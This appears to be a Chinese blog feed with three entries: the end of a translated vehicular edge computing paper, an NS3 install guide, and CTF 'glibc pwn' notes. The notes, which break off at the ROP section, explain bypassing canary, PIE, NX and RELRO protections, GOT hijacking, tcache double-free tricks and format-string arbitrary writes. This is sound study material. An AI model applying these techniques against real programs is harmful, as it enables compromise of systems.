周期增加时，四种加载方案的电视平均成本也会增加。原因是，电视需要购买更多的计算资源来计算其任务，这会导致更大的延迟、能耗和费用。从曲线变化程度来看，也说明我们的方案具有更好的稳定性。</p><p>为了研究延迟权重对电视平均成本的影响，我们模拟了图6中不同权重下的结果。可以看出，在延迟权重下，电视的平均成本随着延迟权重的增加而增加。提出的方案，而曲线的斜率代表全网延迟。相反，基准方案的电视平均成本有所下降。我们提出的方案在不同的时间延迟和能耗权重下始终优于基准方案。我们提出的方案的曲线斜率低于其他基线的曲线斜率，这验证了我们提出的算法的鲁棒性。</p><p>此外，我们还在图7中研究了权重变化对延迟和能耗的影响。随着延迟权重的增加，电视的平均延迟降低，电视的平均能耗增加，如图7所示。原因在于，如果电视的延迟权重增大，则延迟对电视平均成本的贡献就越大，并且在车辆成本最小化的情况下，电视的平均延迟呈现下降趋势。能耗权重的降低意味着能耗对电视平均成本的贡献变小，平均能耗呈现增加趋势。此外，电视的低延迟是以能源消耗和负载成本为代价的。本文中，我们设定一个SV只能为一台电视提供加载服务，即Q=1。为了分析Q值的变化对电视平均成本的影响，我们模拟了这种变化当Q &gt; 1时该方案的效果。</p><p>图8评估了SV可以服务的最大电视数量对电视平均成本的影响。我们可以观察到电视平均成本呈增加趋势，并且当Q=1时最低。这是因为，当Q的数量增加时，每个SV可以服务的TV数量增加，分配给每个TV的计算资源减少。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/40.png" alt="40"></p><p>我们还在图 9(a) 和图 9(b) 中研究了总成本以及延迟、能耗和开销的变化。当Q增加时，所提出方案的平均成本增加，类似于图8。此外，当Q增加时，所提出方案的卸载延迟增加。相反，所提出的方案的卸货能耗和卸货费用减少了。这是因为SV的计算资源是有限的，而TV更愿意花更多的钱购买更多的计算资源来将其任务卸载到RSU服务器。这也是图8中趋势不明显的原因。</p><h2 id="7-结论">7.结论</h2><p>在本文中，我们联合优化了VEC网络中的负载计算和资源分配，并考虑车辆的移动性提出了一种高效的卸载方案。通过结合考虑模式选择和资源分配以及差异定价，我们的优化问题在计算任务的延迟和计算资源约束下最小化电视的平均成本。通过将问题分解为两个子问题，利用匹配理论解决模式选择子问题，利用拉格朗日方法解决资源分配子问题。最后，我们提出了一种分布式迭代算法来解决原始优化问题。仿真结果证明，与三种基准加载方案相比，我们提出的方案始终能够实现所有TV的平均成本较低。</p>]]></content>
    
    
    <categories>
      
      <category>论文笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VEC</tag>
      
      <tag>IoV</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NS3安装</title>
    <link href="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>我这里用的是vmware+ubuntu22</p><p>还是建议新创一个虚拟机，简单省事，磁盘划多一点，我划了40g</p><h2 id="配置NS3环境">配置NS3环境</h2><h3 id="安装NS3依赖库">安装NS3依赖库</h3><p>更新apt</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get update<br></code></pre></td></tr></table></figure><p>（1）安装Python API 用户的最低要求（3.30 版及更高版本，以及 ns-3-dev）：这是从已发布的压缩包中使用 Python 绑定所需的最小包集。C++用户的最低要求（3.36 版和开发）：对于 ns-3-dev 和 ns-3.36（及更高版本）版本，还需要 CMake。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install g++ python3 python3-dev pkg-config sqlite3 cmake<br></code></pre></td></tr></table></figure><p>（2）安装NS3代码维护使用的源码版本控制管理系统</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install mercurial<br></code></pre></td></tr></table></figure><p>（3）Netanim动画师需要qt5开发工具，对于 Ubuntu 20.10 及更早版本，单个 “qt5-default” 包就足够了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install qt5-default<br></code></pre></td></tr></table></figure><p>对于更高版本ubuntu，可运行如下命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">apt-get install qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools<br>apt-get install qtcreator<br>apt-get install qt5*<br></code></pre></td></tr></table></figure><p>（4）运行python绑定ns-3-dev需要bazaar这个组件。（支持bake构建工具）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install autoconf cvs bzr unrar<br></code></pre></td></tr></table></figure><p>（5）安装调试工具</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install gdb valgrind<br></code></pre></td></tr></table></figure><p>（6）支持更多精确WIFI模块的GNU Scientific Library (GSL)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install gsl-bin libgsl-dev libgslcblas0<br></code></pre></td></tr></table></figure><p>（7）仿真必需的词法分析器和语法分析生成器，必装</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install flex bison libfl-dev<br></code></pre></td></tr></table></figure><p>（8）一些Network Simulation Cradle (nsc) stacks需要gcc-3.4</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install g++-3.4 gcc-3.4<br></code></pre></td></tr></table></figure><p>（9）读取pcap的packet traces，即包嗅探器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install tcpdump<br></code></pre></td></tr></table></figure><p>（10）支持统计特性的数据库软件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install sqlite sqlite3 libsqlite3-devsudo apt-get install g++-3.4 gcc-3.4<br></code></pre></td></tr></table></figure><p>（11）xml的配置存储软件(requires libxml2 &gt;= version 2.7)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install libxml2 libxml2-dev<br></code></pre></td></tr></table></figure><p>（12）基于GTK的配置系统</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install libgtk2.0-0 libgtk2.0-dev<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install libgtk-3-dev<br></code></pre></td></tr></table></figure><p>（13）在虚拟机and ns-3上测试</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install vtun lxc uml-utilities<br></code></pre></td></tr></table></figure><p>（14）支持utils/check-style.py 代码风格检查程序</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install uncrustify<br></code></pre></td></tr></table></figure><p>（15）文档生成器，从源代码中生成说明文档</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install doxygen graphviz imagemagick<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install texlive texlive-extra-utils texlive-latex-extra texlive-font-utils dvipng latexmk<br></code></pre></td></tr></table></figure><p>（16）ns-3手册和教程是用reStructuredText for Sphinx编写的（doc/tutorial、doc/manual、doc/models），并且图形通常以dia为单位：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install python3-sphinx dia <br></code></pre></td></tr></table></figure><p>（17）Gustavo’s ns-3-pyviz的可视化软件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install gir1.2-goocanvas-2.0 python3-gi python3-gi-cairo python3-pygraphviz gir1.2-gtk-3.0 ipython3<br></code></pre></td></tr></table></figure><p>（18）支持openflow 模块(需要一些boost库)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install libxml2 libxml2-dev libboost-all-dev<br></code></pre></td></tr></table></figure><p>（19）支持基于 MPI的分布式仿真</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install openmpi-bin openmpi-common openmpi-doc libopenmpi-dev<br></code></pre></td></tr></table></figure><h3 id="安装ns3的基础模块">安装ns3的基础模块</h3><p>现在最新3.40版本，选择下载3.40版本</p><p><a href="https://www.nsnam.org/releases/ns-3-40/">ns-3.40 | ns-3 (nsnam.org)</a></p><p>下载下来放到虚拟机里解压</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">tar -jxvf ns-allinone-3.40.tar.bz2<br></code></pre></td></tr></table></figure><p>cd 至ns-allinone-3.40/ns-3.40</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">./ns3 configure --enable-examples --enable-tests  <span class="hljs-comment"># 配置文件</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/2.png" alt="2"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">./ns3 build  <span class="hljs-comment"># 编译ns3</span><br></code></pre></td></tr></table></figure><p>编译有点慢，我编译到90%卡住了</p><p>重启了下，完成剩下的10%</p><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/3.png" alt="3"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">./test.py  <span class="hljs-comment"># 测试</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/4.png" alt="4"></p><p>ok没问题</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">./ns3 run first  <span class="hljs-comment"># 运行第一个脚本</span><br>./ns3 run <span class="hljs-string">&#x27;first --PrintHelp&#x27;</span><br><span class="hljs-comment"># 进入超级用户之后无法运行脚本（Refuse to run as root）</span><br></code></pre></td></tr></table></figure><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/5.png" alt="5"></p><h3 id="NetAnim安装与启动">NetAnim安装与启动</h3><p>cd进入到ns-allinone-3.40/netanim-3.109</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo qmake NetAnim.pro  <span class="hljs-comment"># NetAnim的编译安装</span><br>sudo make<br></code></pre></td></tr></table></figure><p>这里显示没有qmake这个命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">apt更新了也还是没有可用的软件包 qt5-default，但是它被其它的软件包引用了。<br>这可能意味着这个缺失的软件包可能已被废弃，<br>或者只能在其他发布源中找到<br></code></pre></td></tr></table></figure><p>解决方法：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">apt-get install qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools<br>apt-get install qtcreator<br>apt-get install qt5*<br></code></pre></td></tr></table></figure><p>ok继续重新执行前两步</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo qmake NetAnim.pro  <span class="hljs-comment"># NetAnim的编译安装</span><br>sudo make<br></code></pre></td></tr></table></figure><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/6.png" alt="6"></p><p>成功</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo ./NetAnim<br></code></pre></td></tr></table></figure><p>启动看看</p><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/7.png" alt="7"></p><blockquote><p>感觉还是划少了，只有14个g可用了，磁盘扩充有点麻烦</p></blockquote><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/FA49WDR@N9Q3ITL4UXD%5D%5BL.png" alt="img"></p><h2 id="开发环境配置">开发环境配置</h2><p>我选VScode</p><p>去官网下载好deb，放入ubuntu，dpkg命令安装好</p><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/9.png" alt="9"></p><h3 id="安装插件">安装插件</h3><p><img src="/2024/02/08/ns3%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/10.png" alt="10"></p><h3 id="配置环境">配置环境</h3><p>在ns3目录里启动vscode</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">nq@nq-virtual-machine:~/桌面/ns-allinone-3.40$ code .<br></code></pre></td></tr></table></figure><p>按F1（Ctrl+Shift+P）调出命令面板，配置相关设置“c/c++: Edit configurations(json)</p><p>还有点问题，未完待续</p><h2 id="参考">参考</h2><p><a href="https://blog.csdn.net/qq_53273581/article/details/124848777">Ubuntu20.04安装NS3的3.36版本（最新版本）_ns3安装eclipse csdn-CSDN博客</a></p><p><a href="https://blog.csdn.net/Graduate2015/article/details/129301363">【ns-3】VS Code开发环境配置_如何用vscode打开ns3-CSDN博客</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>NS3</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>glibc pwn总结</title>
    <link href="/2024/01/26/pwn%E6%80%BB%E7%BB%93/"/>
    <url>/2024/01/26/pwn%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h3 id="前言">前言</h3><blockquote><p>linux平台下glibc pwn 一般都是给个linux二进制文件，题目预先设计好了某个漏洞，然后你能利用漏洞，达成任意地址读/写，控制程序流，达成getshell或orw读flag什么的</p><p>一般做题步骤：</p><p>1.一般拿到程序先checksec看下保护，然后运行下程序，看看功能，简单做些交互</p><p>2.然后用ida分析那个二进制程序的伪代码，读懂程序，找漏洞</p><p>3.思考利用方法，配合GDB调试，编写出exp</p></blockquote><h3 id="Defense">Defense</h3><h4 id="Canary">Canary</h4><p>canary是一种用来防护栈溢出的保护机制。原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致</p><p>若一致则正常退出，如果是栈溢出或者其他原因导致canary的值发生变化，那么程序将执行___stack_chk_fail函数，继而终止程序</p><h5 id="trick：">trick：</h5><ul><li>因为canary末尾是/x00，本身可以被截断，可以栈溢出修改掉末尾的/x00，配合输出函数，泄露canary</li><li>某些用fork函数的题，父子进程的canary是一样的，逐位爆破canary</li><li>Stack Smashing Protect Leak</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">__libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminatedn&quot;</span>,<br>                   msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br></code></pre></td></tr></table></figure><ul><li>got表劫持__stack_chk_fail</li></ul><h4 id="PIE">PIE</h4><p>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址</p><h5 id="trick：-2">trick：</h5><ul><li>partial write：partial write(部分写入)就是一种利用了PIE技术缺陷的bypass技术。由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的。因此通过覆盖EIP的后8或16位 (按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。</li></ul><h4 id="NX">NX</h4><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p>即使某些内存区域不可执行，并使可执行区域不可写</p><p>例：使数据，堆栈和堆段不可执行，而代码段不可写</p><h5 id="trick：-3">trick：</h5><ul><li>一般就是在栈这块地址没法直接执行shellcode，用ROP执行特定的代码段的代码，以达到控制执行流，getshell等目的</li></ul><h4 id="RELRO">RELRO</h4><p>RELRO(RELocation Read-Only, 重定位只读), 此技术主要针对 GOT 改写的攻击方式。分为部分 <strong>RELRO(Partial RELRO)</strong> 与完全 <strong>RELRO(Full RELRO)</strong> 两种</p><ul><li><strong>部分 RELRO</strong>: 在程序装入后，将其中一段 (如<code>.dynamic</code>) 标记为只读，防止程序的一些重定位信息被修改</li><li><strong>完全 RELRO</strong>: 在部分 RELRO 的基础上，在 程序装入时，直接解析完所有符号并填入对应的值，此时所有的 GOT 表项都已初始化，且不装入 <code>link_map</code> 与<code>_dl_runtime_resolve</code> 的地址 (二者都是程 序动态装载的重要结构和函数)。</li></ul><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT（Global Offset Table）攻击。RELRO 为” Partial RELRO”, 说明我们对 GOT 表具有写权限。</p><ul><li>当RELRO保护为NO RELRO的时候，init.array、fini.array、got.plt均可读可写；</li><li>为PARTIAL RELRO的时候，ini.array、fini.array可读不可写，got.plt可读可写；</li><li>为FULL RELRO时，init.array、fini.array、got.plt均可读不可写。</li><li>程序在加载的时候，会依次调用init.array数组中的每一个函数指针，在结束的时候，依次调用fini.array中的每一个函数指针当程序出现格式化字符串漏洞，但是需要写两次才能完成攻击，这个时候可以考虑改写fini.array中的函数指针为main函数地址，可以再执行一次main函数。一般来说，这个数组的长度为1，也就是说只能写一个地址。</li></ul><h5 id="trick：-4">trick：</h5><p><strong>GOT Hijacking：</strong></p><p>NO RELRO与PARTIAL RELRO时采用Lazy Binding（延迟绑定）机制时：</p><p>因为不一定每个库函数都会被执行到，所以采用lazy binding的机制，当第一次执行到库函数的某个功能时才会去寻找真正的地址并进行绑定</p><p>Global Offset Table：（GOT）</p><blockquote><p>got在.data段</p><p>plt在.code段的地方</p></blockquote><p>方法：利用程序中某个漏洞，做到例如任意地址写，我们就可以把那个got中的那个地址写成我们要去的地址</p><p>在call 原本那个函数时，就会调我们想去的地址。</p><h4 id="ALSR">ALSR</h4><p>ASLR (Address Space Layout Randomization), 地址空间配置随机加载，简称地址随机化</p><p>heap段，libc段，stack段等开启ALSR之后地址都是不固定的</p><p>值得<strong>注意的是ALSR是系统级的，而PIE是程序级的，一般是系统默认开启ASLR的</strong></p><h5 id="trick：-5">trick：</h5><ul><li><strong>泄露程序地址来绕过ALSR</strong>: 目前广泛应用在操作系统的地址随机化多为粗粒度的实现方式，同一模块中的所有代码与数据的相对偏移固定。只需要通过信息泄露漏洞将某个模块中的任一代码指针或者数据指针泄露，即可通过计算得到此模块中任意代码或数据的地址</li></ul><h4 id="FORTIFY">FORTIFY</h4><p>这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。简单地说，加了这个保护之后（编译时加上参数-D_FORTIFY_SOURCE=2）一些敏感函数如read, fgets,memcpy, printf等等可能导致漏洞出现的函数都会被替换成__read_chk,__fgets_chk, __memcpy_chk,  __printf_chk等。这些带了chk的函数会检查读取/复制的字节长度是否超过缓冲区长度，通过检查诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串跳过某些参数（如直接%7$x）等方式来避免漏洞出现。开启了FORTIFY保护的程序会被checksec检出，此外，在反汇编时直接查看got表也会发现chk函数的存在</p><h3 id="Types-of-vulnerabilities">Types of vulnerabilities</h3><h4 id="Stack-Overflow">Stack Overflow</h4><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。</p><h4 id="Heap-Overflow">Heap Overflow</h4><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数，因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。</p><p>我们在熟悉堆机制的情况下，运用你高超的堆风水技巧，伪造堆结构体，伪造I/O File结构体等，达成任意地址读写，或者更严格点，在特定位置写入特定值，就可以控制程序getshell等</p><h5 id="off-by-one-off-by-null">off by one/off by null</h5><p>off by one 通常指的是对于堆块的读写存在一个字节的溢出</p><p>off by null则是off by one的一种特殊形式，即仅溢出一个<code>'\0'</code>字节，通常出现于读入字符串时设计逻辑失误的情况（例如使用了 strcpy 或者是手动在末尾加 \0 等）</p><p>其实这两个差不多，只能溢出一个字节我们怎么利用呢？</p><p>一般可以溢出到一个chunk物理相邻高地址 chunk 的 size 域，篡改其 size 域以便后续的利用（例如可以利用造成堆重叠，unlink之类的）</p><h4 id="Use-After-Free">Use After Free</h4><p>字面意思，即当一个内存块被释放之后再次被使用</p><h5 id="发生UAF的情况：">发生UAF的情况：</h5><ul><li>内存块被释放后，其对应的指针没有设置为 NULL</li></ul><h5 id="double-free">double free</h5><ul><li>在glibc2.27之前，主要是fastbin double free：<br>fastbin在free时只会检查现在释放的chunk，是不是开头的chunk，因此可以通过free(C1), free(C2), free(C1)的手法绕过<br>并在在fastbin取出时，会检查size字段是不是属于这个fastbin，因此往往需要伪造一个size</li><li>glibc2.27~glibc2.28，主要是tcache double free<br>相较于fastbin double free，tcache完全没有任何检查，只需要free(C1), free(C1)就可以构造一个环出来</li></ul><blockquote><p><s>这里可能存疑，我怎么记得我做省赛的题glibc2.27里面tcache double free要修改key才能绕过</s></p><p>实际是2.27有的版本没检测，有的版本有tcache doublefree检测</p></blockquote><ul><li>glibc2.29～glibc2.3X，tcache加入了检查机制</li></ul><h6 id="检测：">检测：</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> tc_idx = csize2tidx(size);<br><span class="hljs-comment">//只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查</span><br><span class="hljs-keyword">if</span> (tcache != <span class="hljs-literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>&#123;<br>  <span class="hljs-comment">/* Check to see if it&#x27;s already in the tcache.  */</span><br>  tcache_entry *e = (tcache_entry *)chunk2mem(p);<br> <br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来</span><br><span class="hljs-comment">    如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class="hljs-comment">//剪枝</span><br>  &#123;<br>    tcache_entry *tmp;<br>    LIBC_PROBE(memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)<br>      <span class="hljs-keyword">if</span> (tmp == e)<br>        malloc_printerr(<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>  &#125;<br> <br>  <span class="hljs-keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="hljs-comment">//通过检查，放入tcahce中</span><br>  &#123;<br>    tcache_put(p, tc_idx);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>两种方法绕过</p><ol><li>想办法修改key字段，能编辑free后的堆改掉key就能绕过</li><li>使用fastbin double free</li></ol><h4 id="Format-String">Format String</h4><p>格式化字符串漏洞的成因在于像printf/sprintf/snprintf等格式化打印函数都是接受可变参数的，而一旦程序编写不规范，比如正确的写法是：<code>printf(&quot;%s&quot;, pad)</code>，写成了：<code>printf(pad)</code>，此时就存在格式化字符串漏洞。</p><p><strong>格式化字符串漏洞最终可以做到任意地址读/写</strong></p><p>我们一般会分两大步实现漏洞利用：</p><ul><li>第一步构造一个payload来寻找输入字符串到栈顶指针的偏移；</li><li>第二步就是攻击了，利用找到的偏移，在偏移处填入目的地址可以实现目的地址的内容泄露以及内容改写。</li></ul><p><strong>常用基本的格式化字符串参数介绍：</strong></p><ul><li><p>%c：输出字符，配上%n 可用于向指定地址写数据。</p></li><li><p>%d：输出十进制整数，配上%n 可用于向指定地址写数据。</p></li><li><p>%x：输出 16 进制数据，如%i$x 表示要泄漏偏移 i 处 4 字节长的 16 进制数 据，</p></li><li><p>%i$lx 表示要泄漏偏移 i 处 8 字节长的 16 进制数据，32bit 和 64bit 环境下一 样。</p></li><li><p>%p：输出 16 进制数据，与%x 基本一样，只是附加了前缀 0x，在 32bit 下输 出 4 字节，在 64bit 下输出 8 字节，可通过输出字节的长度来判断目标环境是 32bit 还是 64bit。</p></li><li><p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s 表示 输出偏移 i 处地址所指向的字符串，在 32bit 和 64bit 环境下一样，可用于读取 GOT 表等信息。</p></li><li><p>%n：将%n 之前 printf 已经打印的字符个数赋值给偏移处指针所指向的地址 位置，如%100×10$n 表示将 0x64 写入偏移 10 处保存的指针所指向的地址（4 字节），而%$hn 表示写入的地址空间为 2 字节，%$hhn 表示写入的地址空间为 1 字节，%$lln 表示写入的地址空间为 8 字节，在 32bit 和 64bit 环境下一样。有时， 直接写 4 字节会导致程序崩溃或等候时间过长，可以通过%$hn 或%$hhn 来适时 调整。</p></li><li><p>%n 是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符 串参数可用于读取信息或配合%n 写数据。</p></li></ul><p>32位/64位下略有差异</p><p>pwntools里fmtstr模块能很方便的使用</p><blockquote><p>fmtstr_payload是pwntools里面的一个工具，用来简化对格式化字符串漏洞的构造工作。</p><p>fmtstr_payload(offset, writes, numbwritten=0, write_size=‘byte’)</p><p>第一个参数表示格式化字符串的偏移；</p><p>第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT: systemAddress}；本题是将0804a048处改为0x2223322</p><p>第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；</p><p>第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。 fmtstr_payload函数返回的就是payload</p><p>实际上我们常用的形式是fmtstr_payload(offset,{address1:value1})</p></blockquote><p>自己手写起来还是挺麻烦的，需要把要写的值拆成两部分，分两次写(先写小的值，后写大的值)，还要防止截断（那些输入函数一般都有/x00截断）</p><h4 id="Integer-Overflow">Integer Overflow</h4><h4 id="Type-Confusion">Type Confusion</h4><h4 id="Race-Condition">Race Condition</h4><h4 id="OOB">OOB</h4><p>(Out-of-Bounds)数组越界</p><h3 id="Stack-Exploitation">Stack Exploitation</h3><h4 id="ROP">ROP</h4><p>即返回导向编程（Return Qriented Proramming）</p><p>通过不断去执行包含ret的程序片段来达到想要的操作</p><p>这些包含ret的程式片段又被称作gadget</p><p>例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">4004fa:48 83 c4 08       add    rsp,0x8<br>4004fe:5d                ret<br></code></pre></td></tr></table></figure><h4 id="SROP">SROP</h4><p>SROP的全称是Sigreturn Oriented 